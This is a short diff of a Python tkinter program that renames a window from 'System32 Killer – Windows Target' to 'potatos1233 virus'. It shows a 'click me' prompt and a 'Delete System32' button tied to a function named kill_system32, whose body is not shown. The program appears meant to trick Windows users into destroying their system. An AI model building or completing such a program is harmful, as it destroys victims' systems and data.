@@ -13,7 +13,7 @@ def kill_system32():
 def launch():
     messagebox.showinfo("click me", "go ahead click the button")
     win = tk.Toplevel()
-    win.title("System32 Killer – Windows Target")
+    win.title("potatos1233 virus")
     
     btn = tk.Button(win,
                     text="Delete System32",
